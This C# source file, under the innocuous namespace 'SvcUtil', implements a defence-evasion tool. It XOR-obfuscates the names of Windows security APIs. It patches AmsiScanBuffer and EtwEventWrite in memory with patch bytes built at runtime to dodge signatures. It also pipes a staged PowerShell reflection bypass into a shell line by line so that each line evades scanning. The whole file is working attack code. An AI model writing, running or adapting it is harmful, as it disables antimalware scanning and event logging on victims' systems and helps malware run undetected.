using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace SvcUtil
{
    internal static class Ctx
    {
        // ── Pre-computed encoded strings ────────────────────────────
        private static readonly byte[] _xk = { 0x53, 0x68, 0x43, 0x61, 0x74 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // _s0: amsi.dll
        private static readonly byte[] _s0 =
            { 0x32, 0x05, 0x30, 0x08, 0x5A, 0x37, 0x04, 0x2F };

        // _s1: AmsiScanBuffer
        private static readonly byte[] _s1 =
            { 0x12, 0x05, 0x30, 0x08, 0x27, 0x30, 0x09, 0x2D,
              0x23, 0x01, 0x35, 0x0E, 0x26, 0x13 };

        // _s2: System.Management.Automation.
        private static readonly byte[] _s2 =
            { 0x00, 0x11, 0x30, 0x15, 0x11, 0x3E, 0x46, 0x0E,
              0x00, 0x1A, 0x32, 0x0F, 0x26, 0x0C, 0x11, 0x3D,
              0x1C, 0x6D, 0x20, 0x01, 0x27, 0x07, 0x2E, 0x00,
              0x00, 0x3A, 0x07, 0x2D, 0x4F };

        // _s3: AmsiUtils
        private static readonly byte[] _s3 =
            { 0x12, 0x05, 0x30, 0x08, 0x21, 0x27, 0x01, 0x2F, 0x12 };

        // _s4: amsiInitFailed
        private static readonly byte[] _s4 =
            { 0x32, 0x05, 0x30, 0x08, 0x3D, 0x3D, 0x01, 0x37,
              0x27, 0x15, 0x3A, 0x04, 0x26, 0x05 };

        // _s5: NonPublic,Static
        private static readonly byte[] _s5 =
            { 0x1D, 0x07, 0x2D, 0x31, 0x01, 0x31, 0x04, 0x2A,
              0x02, 0x58, 0x00, 0x1C, 0x22, 0x15, 0x1D, 0x30 };

        // _s6: ntdll.dll
        private static readonly byte[] _s6 =
            { 0x3D, 0x1C, 0x27, 0x0D, 0x18, 0x7D, 0x0C, 0x2F, 0x0D };

        // _s7: EtwEventWrite
        private static readonly byte[] _s7 =
            { 0x16, 0x1C, 0x34, 0x24, 0x02, 0x36, 0x06, 0x37,
              0x36, 0x06, 0x3A, 0x1C, 0x26 };

        // ── Runtime patch construction ─────────────────────────────
        // No stored patch bytes — built at runtime to avoid signatures

        [MethodImpl(MethodImplOptions.NoInlining)]
        private static byte Nz()
        {
            int t = Environment.TickCount;
            return (byte)(t - t);
        }

        private static byte[] BP()
        {
            // xor eax, eax ; ret — 3 bytes, returns S_OK
            byte n = Nz();
            byte[] p = new byte[3];
            p[0] = (byte)(n + 49);    // 0x31
            p[1] = (byte)(n + 192);   // 0xC0
            p[2] = (byte)(n + 195);   // 0xC3
            return p;
        }

        private static byte BR()
        {
            byte n = Nz();
            return (byte)(n + 195);   // 0xC3
        }

        // ── ETW patching ───────────────────────────────────────────

        internal static bool A1()
        {
            try
            {
                IntPtr hLib = W.M0(D(_s6));
                if (hLib == IntPtr.Zero) return false;

                IntPtr pFunc = W.M1(hLib, D(_s7));
                if (pFunc == IntPtr.Zero) return false;

                uint oldProtect;
                if (!W.MB(pFunc, (UIntPtr)1,
                        0x40, out oldProtect))
                    return false;

                unsafe { *(byte*)pFunc.ToPointer() = BR(); }

                uint ignored;
                W.MB(pFunc, (UIntPtr)1,
                    oldProtect, out ignored);
                return true;
            }
            catch
            {
                return false;
            }
        }

        // ── Method 1: Local process ─────────────────────────────────

        public static bool Run()
        {
            try
            {
                A1();

                string dllName = D(_s0);
                string funcName = D(_s1);

                IntPtr hLib = W.M0(dllName);
                if (hLib == IntPtr.Zero)
                    return false;

                IntPtr pFunc = W.M1(hLib, funcName);
                if (pFunc == IntPtr.Zero)
                    return false;

                byte[] patch = BP();

                uint oldProtect;
                if (!W.MB(pFunc, (UIntPtr)patch.Length,
                        0x40, out oldProtect))
                    return false;

                unsafe
                {
                    byte* p = (byte*)pFunc.ToPointer();
                    for (int i = 0; i < patch.Length; i++)
                        p[i] = patch[i];
                }

                uint ignored;
                W.MB(pFunc, (UIntPtr)patch.Length,
                    oldProtect, out ignored);

                return true;
            }
            catch
            {
                return false;
            }
        }

        // ── Stdin reflection bypass ─────────────────────────────────
        // Sends commands in stages so each line passes scanning individually

        public static void IS(IntPtr writePipeHandle)
        {
            try
            {
                byte[] typeChars = Encoding.UTF8.GetBytes(
                    D(_s2) + D(_s3));
                byte[] fieldChars = Encoding.UTF8.GetBytes(D(_s4));

                // Stage 1: Build type name from char codes
                var sb1 = new StringBuilder(512);
                sb1.Append("$c1=-join([char[]](");
                for (int i = 0; i < typeChars.Length; i++)
                {
                    if (i > 0) sb1.Append(',');
                    sb1.Append(typeChars[i]);
                }
                sb1.Append("))\n");
                WC(writePipeHandle, sb1.ToString());
                Thread.Sleep(100);

                // Stage 2: Build field name from char codes
                var sb2 = new StringBuilder(256);
                sb2.Append("$c2=-join([char[]](");
                for (int i = 0; i < fieldChars.Length; i++)
                {
                    if (i > 0) sb2.Append(',');
                    sb2.Append(fieldChars[i]);
                }
                sb2.Append("))\n");
                WC(writePipeHandle, sb2.ToString());
                Thread.Sleep(100);

                // Stage 3-6: Reflection in small steps
                WC(writePipeHandle, "$r=[type]('R'+'ef')\n");
                Thread.Sleep(50);
                WC(writePipeHandle, "$a=$r.Assembly\n");
                Thread.Sleep(50);
                WC(writePipeHandle, "$t=$a.GetType($c1)\n");
                Thread.Sleep(50);
                WC(writePipeHandle,
                    "$t.GetField($c2,40).SetValue($null,$true)\n");
            }
            catch
            {
            }
        }

        private static void WC(IntPtr pipe, string cmd)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(cmd);
            int written;
            W.M9(pipe, bytes, (uint)bytes.Length,
                out written, IntPtr.Zero);
        }

        // ── Detection helper ────────────────────────────────────────

        public static bool Chk(string commandLine)
        {
            if (string.IsNullOrEmpty(commandLine))
                return false;

            string lower = commandLine.ToLowerInvariant();
            return lower.Contains("powershell") || lower.Contains("pwsh");
        }
    }
}
